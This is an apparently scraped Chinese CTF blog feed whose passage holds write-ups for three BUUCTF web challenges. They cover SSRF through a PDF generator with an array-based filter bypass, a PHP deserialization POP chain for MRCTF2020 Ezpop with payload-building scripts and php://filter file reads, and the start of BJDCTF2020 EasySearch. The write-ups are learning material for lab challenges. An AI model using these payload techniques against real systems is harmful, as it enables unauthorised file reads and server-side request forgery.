class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> HTML code are executed <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> server. Input <span class="hljs-keyword">with</span> <span class="hljs-keyword">an</span> XHR request such <span class="hljs-keyword">as</span> request.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>) will <span class="hljs-built_in">result</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> PDF document <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> contents <span class="hljs-keyword">of</span> /etc/passwd.<br></code></pre></td></tr></table></figure><p>因此可以利用制造pdf的功能来实现ssrf，把flag给admin用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;<br><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="hljs-literal">true</span>);xhr.send();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>而且filename字段是UNIQUE，需要不能直接flag，用./flag。</p><p>但是有个问题就是这个过滤：</p><pre><code>if ( content == &#39;&#39; || content.includes(&#39;&lt;&#39;) || content.includes(&#39;&gt;&#39;) || content.includes(&#39;/&#39;) || content.includes(&#39;script&#39;) || content.includes(&#39;on&#39;))&#123;    // even admin can&#39;t be trusted right ? :)      return res.render(&#39;admin&#39;, &#123; error: &#39;Forbidden word 🤬&#39;&#125;);&#125; else &#123;</code></pre><p>当时自己就卡在了这里，不知道怎么绕过。关键就在于node.js的弱类型和php的弱类型有所不同。js中数组和字符串拼接的话，比如[“hello”]+”world”，得到的是helloworld，而php里确实Arrayworld。也是因为深受php的影响，所以没想到这里可以用数组来绕过，记得URL编码</p><p>然后我是丢进bp里，只需要content改成content[],传数组</p><p><img src="/2021/09/07/2021/ctf/21/image-20210908115802410.png" alt="image-20210908115802410"></p><p><img src="/2021/09/07/2021/ctf/21/image-20210908120122404.png" alt="image-20210908120122404"></p><p>出现这个页面就是成功</p><p><img src="/2021/09/07/2021/ctf/21/image-20210908120634020.png" alt="image-20210908120634020"></p><p>打开后就有flag</p><p><img src="/2021/09/07/2021/ctf/21/image-20210908120715884.png" alt="image-20210908120715884"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 Ezpop</title>
      <link href="/2021/09/03/2021/ctf/19/"/>
      <url>/2021/09/03/2021/ctf/19/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p>借鉴博客</p><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpop—序列化pop链_marsxu626的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p><p>这题是代码审计和反序类化中的绕过，如何构造pop链是最终目的</p><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">Welcome to index.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>($value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;<br>        $function = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> $function();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    $a=<span class="hljs-keyword">new</span> Show;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来分而解析几个不同的类</p><p>1.Modifier类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var;<span class="hljs-comment">//variable，变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params">$value</span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>($value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个我在把文件放进seay审计系统里跑的时候就跑出了</p><p>include文件包含漏洞，而这也是我们最后要达成的目的：</p><p>利用文件包含漏洞和php伪协议来读取flag文件</p><p>但是并没有那么简单，因为对于上传内容会进行反序类化，改变了值</p><p>所以我们得想办法绕过</p><p>这里还有魔术方法<strong>__invoke</strong> ，当脚本尝试将对象调用为函数时触发，所以在脚本中要把Modifier类调用为函数，这样最后赋值到var上。</p><p>2.Show类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到了这里的_wakeup()函数，在反序列化时一定会首先调用其函数，过滤了不老少关键字，但是像filter://伪协议却没有过滤。</p><p>而_toString把类当作字符串时触发</p><p>所以得出wakeup方法可以触发tostring方法</p><p>3.Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>&#123;<br>        $function = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> $function();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有魔术方法：<strong>__get</strong> 从不可访问的属性中读取数据会触发<br>会返回function作为函数调用。</p><p>思路得出：</p><p>​        首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php</p><p>payload1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;source = $file;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;karsa&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>&#125;<br><br>$a = <span class="hljs-keyword">new</span> Show(<span class="hljs-string">&#x27;aaa&#x27;</span>);<br>$a-&gt;str = <span class="hljs-keyword">new</span> Test();<br>$a-&gt;str-&gt;p = <span class="hljs-keyword">new</span> Modifier();<br>$b = <span class="hljs-keyword">new</span> Show($a);<br><span class="hljs-keyword">echo</span> urlencode(serialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Show%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>source%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Br%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>str%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>str%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Test%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>p%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Read%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>var%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>flag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  $var = <span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>    <br>    &#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>     <span class="hljs-keyword">public</span> $source;<br>    <span class="hljs-keyword">public</span> $str;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;str = <span class="hljs-keyword">new</span> Test();<br>        <br>    &#125;<br>&#125;  <br>    <br>    <br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $p;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">new</span> Modifier();<br>    &#125;<br>&#125;<br>$a = <span class="hljs-keyword">new</span> Show();<br>$b = <span class="hljs-keyword">new</span> Show();<br>$b-&gt;source = $a;<br>$b-&gt;str = <span class="hljs-string">&quot;&quot;</span>;<br>var_dump(urlencode(serialize($b)));<br><br></code></pre></td></tr></table></figure><p>得到：</p><p><img src="/2021/09/03/2021/ctf/19/image-20211022163619114.png" alt="image-20211022163619114"></p><p><img src="/2021/09/03/2021/ctf/19/image-20210904213507487.png" alt="image-20210904213507487"></p><p><img src="/2021/09/03/2021/ctf/19/image-20210904214001095.png" alt="image-20210904214001095"></p><h4 id="0x01知识点"><a href="#0x01知识点" class="headerlink" title="0x01知识点"></a>0x01知识点</h4><p>通过这题好好再恶补一次我的代码审计</p><h5 id="1-this-gt-p"><a href="#1-this-gt-p" class="headerlink" title="1.$this-&gt;p"></a>1.$this-&gt;p</h5><p>摘抄于一篇文章：<a href="https://www.cnblogs.com/ytkah/p/9633690.html">https://www.cnblogs.com/ytkah/p/9633690.html</a></p><p>php中$this-&gt;的用法简单介绍</p><p>php中我们一般是先声明一个类，然后用这个类去实例化对象</p><p>$this的含义是表示实例化后的具体对象</p><p>$this-&gt;表示在类本身内部使用本类的属性或者方法</p><p>‘ -&gt; ’ 符号是插入式解引用操作符。</p><p>换句话说，它是有调用由引用传递参数的子程序的方法</p><p>例子：</p><p>比如我们声明一个User类，它只含有一个属性 $name</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> $_name;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>现在，我们给User类加个方法，就用getName()方法，输出$name的值吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> $_name;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getName</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;name;<br>&#125;<br>&#125;<br><span class="hljs-comment">//如何使用呢？</span><br>$user1 = <span class="hljs-keyword">new</span> User();<br>$user1-&gt;name = <span class="hljs-string">&#x27;张三&#x27;</span>;<br>$user1-&gt;getName();        <span class="hljs-comment">//这里就会输出张三！</span><br>$user2 = <span class="hljs-keyword">new</span> User();<br>$user2-&gt;name = <span class="hljs-string">&#x27;李四&#x27;</span>;  <br>$user2-&gt;getName();       <span class="hljs-comment">//这里会输出李四！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我也上在线工具试了下</p><p><img src="/2021/09/03/2021/ctf/19/image-20210905155102186.png" alt="image-20210905155102186"></p><h5 id="2-PHP中的魔术方法"><a href="#2-PHP中的魔术方法" class="headerlink" title="2.PHP中的魔术方法"></a>2.PHP中的魔术方法</h5><p><a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">__sleep() <span class="hljs-regexp">//</span>使用serialize时触发<br>__destruct() <span class="hljs-regexp">//</span>对象被销毁时触发<br>__call() <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br>__callStatic() <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br>__get() <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br>__set() <span class="hljs-regexp">//</span>用于将数据写入不可访问的属性<br>__isset() <span class="hljs-regexp">//</span>在不可访问的属性上调用isset()或empty()触发<br>__unset() <span class="hljs-regexp">//</span>在不可访问的属性上使用unset()时触发<br>__toString() <span class="hljs-regexp">//</span>把类当作字符串使用时触发<br>__invoke() <span class="hljs-regexp">//</span>当脚本尝试将对象调用为函数时触发<br></code></pre></td></tr></table></figure><h5 id="3-进一步理解本题代码"><a href="#3-进一步理解本题代码" class="headerlink" title="3.进一步理解本题代码"></a>3.进一步理解本题代码</h5><p>_invoke()函数：对象本身是不能够当作函数使用的，一旦被当作函数使用，，就会回调执行 _invoke()方法</p><p>_construct()函数：构造函数/方法</p><p>构造函数（constructor method，也称为构造器）是类中的一种特殊函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">参数列表</span>)</span>&#123;<br>  ... ...<br>&#125;<br></code></pre></td></tr></table></figure><p>_get()函数： 访问不存在的成员变量时触发</p><p>作者这段话今天看懂了点</p><p><img src="/2021/09/03/2021/ctf/19/image-20210905161234966.png" alt="image-20210905161234966"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 EasySearch</title>
      <link href="/2021/09/02/2021/ctf/18/"/>
      <url>/2021/09/02/2021/ctf/18/</url>
      
        <content type="html"><![CDATA[<p> 参考博客：</p><p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p><p>打开后只有一个输入框</p><p>尝试了一下sql注入</p><p>只会出现一样的弹框</p><p><img src="/2021/09/02/2021/ctf/18/image-20210902195901927.png" alt="image-20210902195901927"></p><p>扫描目录后发现还有swp文件</p><p>访问得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>ob_start();<br>function get_hash()&#123;<br>$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;<br>$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times<br>$content &#x3D; uniqid().$random;<br>return sha1($content); <br>&#125;<br>    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);<br>***<br>    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )<br>    &#123;<br>        $admin &#x3D; &#39;6d0bc1&#39;;<br>        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;<br>            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;<br>            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;<br>            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);<br>            $text &#x3D; &#39;<br>            ***<br>            ***<br>            